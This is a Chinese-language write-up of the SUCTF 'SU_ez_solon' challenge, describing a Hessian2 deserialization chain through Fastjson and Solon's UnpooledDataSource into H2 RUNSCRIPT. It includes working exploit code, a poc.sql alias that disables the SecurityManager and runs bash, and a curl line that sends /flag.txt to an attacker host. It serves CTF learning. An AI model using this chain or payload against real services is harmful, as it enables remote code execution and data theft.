# SU_ez_solon

## 题目简述

题目提供一个 Solon 接口 `/hello`，参数 `data` 依次经过 Base64 解码和 Hessian2 反序列化。服务端还会主动对反序列化结果调用 `toString()`：

```java
@Controller
public class IndexController {
    @Mapping("/hello")
    public String hello(
        @Param(defaultValue = "hello") String data
    ) throws Exception {
        byte[] raw = Base64.getDecoder().decode(data);
        Hessian2Input input = new Hessian2Input(
            new ByteArrayInputStream(raw)
        );
        Object object = input.readObject();
        return object.toString();
    }
}
```

关键依赖为：

```xml
<dependency>
    <groupId>com.alipay.sofa</groupId>
    <artifactId>hessian</artifactId>
    <version>3.5.5</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <version>2.2.224</version>
</dependency>
```

Sofa Hessian 的黑名单阻断了多条常见链和 H2 自带的 `JdbcDataSource`，但没有阻断 Solon 的 `UnpooledDataSource`。最终利用链为：

```text
Hessian2Input.readObject()
  -> JSONObject.toString()
  -> Fastjson 序列化 bean 并调用 getter
  -> UnpooledDataSource.getConnection()
  -> DriverManager.getConnection(可控 H2 URL)
  -> H2 INIT / RUNSCRIPT
  -> System.setSecurityManager(null)
  -> 执行命令并读取 /flag.txt
```

## 解题过程

### 1. 从反序列化入口确定触发条件

接口本身已经替攻击者调用：

```java
object.toString()
```

所以不必再寻找 `readObject()`、比较器或异常类来触发 `toString()`。只需要让 Hessian 恢复一个 `toString()` 会继续遍历内部对象的容器。

Fastjson 的 `JSONObject` 正好满足这一条件。其 `toString()` 会把内部值再次序列化；当值是普通 JavaBean 时，Fastjson 会枚举公开 getter。于是可以把目标数据源放进：

```java
JSONObject root = new JSONObject();
root.put("x", dataSource);
```

服务端执行 `root.toString()` 时，就会读取 `dataSource` 的属性。

### 2. 从 JDBC sink 反向寻找可用数据源

H2 建立连接最终会进入：

```text
org.h2.jdbc.JdbcConnection.<init>()
```

因此可以从实现 `javax.sql.DataSource` 的类反向寻找公开的 `getConnection()`。最直观的：

```text
org.h2.jdbcx.JdbcDataSource
```

处于 Sofa Hessian 黑名单覆盖的 `org.h2.jdbcx.` 包中，不能作为对象图节点。

Solon 依赖中另有：

```text
org.noear.solon.data.util.UnpooledDataSource
```

它不在黑名单内，构造函数还能同时设置 URL 和驱动类：

```java
public UnpooledDataSource(
    String url,
    String username,
    String password,
    String driverClassName
) {
    if (Utils.isEmpty(url)) {
        throw new IllegalArgumentException(
            "Invalid ds url parameter"
        );
    }

    this.logWriter = new PrintWriter(System.out);
    this.url = url;
    this.username = username;
    this.password = password;
    this.setDriverClassName(driverClassName);
}
```

危险 getter 为：

```java
public Connection getConnection() throws SQLException {
    return this.username == null
        ? DriverManager.getConnection(this.url)
        : DriverManager.getConnection(
            this.url,
            this.username,
            this.password
        );
}
```

因此 `JSONObject.toString()` 枚举到该 getter 后，可控 URL 会直接进入 `DriverManager`。

### 3. 用 H2 `RUNSCRIPT` 执行远程 SQL

先在攻击者主机准备 `poc.sql`，再让 H2 在连接初始化时从 HTTP 地址读取它：

```java
String jdbcUrl =
    "jdbc:h2:mem:testdb;"
    + "TRACE_LEVEL_SYSTEM_OUT=3;"
    + "INIT=RUNSCRIPT FROM "
    + "'http://ATTACKER:8000/poc.sql'";
```

这里的 `ATTACKER` 必须替换为题目容器可访问的地址。可先让 `poc.sql` 只创建一个无害文件，分别验证 getter、H2 Driver、网络访问和 `RUNSCRIPT` 都已触发。

题目额外设置了 SecurityManager，普通：

```java
Runtime.getRuntime().exec(...)
```

会被权限检查拦截。但策略没有禁止重新设置 SecurityManager，所以可在 H2 动态编译的 Java alias 中先执行：

```java
System.setSecurityManager(null);
```

一个能够回传命令输出的 `poc.sql` 可写为：

```sql
CREATE ALIAS SUCTF_EXEC AS $$
String run(String command) throws Exception {
    System.setSecurityManager(null);

    Process process = new ProcessBuilder(
        "/bin/bash",
        "-c",
        command
    ).start();

    java.util.Scanner scanner = new java.util.Scanner(
        process.getInputStream()
    ).useDelimiter("\\A");

    return scanner.hasNext() ? scanner.next() : "";
}
$$;

CALL SUCTF_EXEC(
    'cat /flag.txt | curl -sS -X POST --data-binary @- http://A'
);
```

`http://A` 是攻击者的接收端。这里把“关闭 SecurityManager”和“执行命令”放在同一个 alias 调用内，避免后续连接或请求恢复原限制。

出题人还提到另一条路线：先落地原生 `.so`，再通过原生库加载绕过 Java 权限检查。但本题并不要求走更复杂的 native 路线，因为 `setSecurityManager(null)` 已可到达。

### 4. 生成 Hessian 对象图

下面给出载荷的核心代码。`hessianSerialize()` 输出原始 Base64，不在 Java 内重复进行 URL 编码：

```java
import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Output;
import org.noear.solon.data.util.UnpooledDataSource;

import java.io.ByteArrayOutputStream;
import java.util.Base64;

public class Exp {
    public static String hessianSerialize(
        Object object
    ) throws Exception {
        ByteArrayOutputStream buffer =
            new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(buffer);
        output.writeObject(object);
        output.flush();
        return Base64.getEncoder().encodeToString(
            buffer.toByteArray()
        );
    }

    public static void main(String[] args) throws Exception {
        String jdbcUrl =
            "jdbc:h2:mem:testdb;"
            + "TRACE_LEVEL_SYSTEM_OUT=3;"
            + "INIT=RUNSCRIPT FROM "
            + "'http://ATTACKER:8000/poc.sql'";

        UnpooledDataSource dataSource =
            new UnpooledDataSource(
                jdbcUrl,
                "suctf",
                "suctf",
                "org.h2.Driver"
            );
        dataSource.setLogWriter(null);

        JSONObject root = new JSONObject();
        root.put("x", dataSource);

        System.out.println(hessianSerialize(root));
    }
}
```

将输出作为 `data` 参数发送：

```bash
curl --get 'http://TARGET/hello' \
  --data-urlencode "data=$PAYLOAD"
```

当服务端执行 `object.toString()` 时，Fastjson 调用数据源 getter，H2 下载并执行 `poc.sql`，alias 关闭 SecurityManager 后读取 `/flag.txt`，结果发送到接收端。

仓库没有保存本题容器或静态 flag 字符串，因此不能从本地文件给出固定值；远程实例应以实际回传结果为准。

### 5. 外部材料的取舍

仓库中的官方链接指向出题人的[赛后说明](https://www.yulate.com/post/suctf2025-chu-ti-ji-lu/)，其中确认了 `UnpooledDataSource -> DriverManager`、H2 和两条 SecurityManager 绕过方向。

接口反编译代码、精确依赖版本、`JSONObject` 外层对象图及 `RUNSCRIPT` 载荷还可由 [GSBP 的原始赛后稿](https://github.com/GSBP0/gsbp0.github.io/blob/5fed4816ee93dc963ddc738b87a4d7e860fa005e/content/post/2025suctf.md)交叉验证。正文已经包含完成解题所需的信息；保留固定提交链接只用于复核证据，不要求读者依赖外链补全步骤。

## 方法总结

本题把三个原本独立的机制串在一起：

1. Hessian 恢复攻击者控制的 `JSONObject`；
2. 接口主动调用 `toString()`，Fastjson 因序列化 bean 而触发任意 getter；
3. 未进黑名单的 Solon `UnpooledDataSource` 把可控 H2 URL 送入 `DriverManager`；
4. H2 `RUNSCRIPT` 动态编译 Java alias；
5. alias 先置空 SecurityManager，再执行读取 flag 的系统命令。

分析 Java 反序列化题时，应同时检查显式的后续调用、依赖黑名单和所有 `DataSource` 实现。已知 gadget 被禁并不代表 sink 消失；只要还能找到一个未被过滤的 getter 到 `DriverManager.getConnection()`，就可以复用同一个 JDBC/H2 终点。对于 SecurityManager，也要区分“阻止进程执行”和“是否允许修改 SecurityManager 本身”，后者往往决定能否用一行状态修改跨过最终边界。
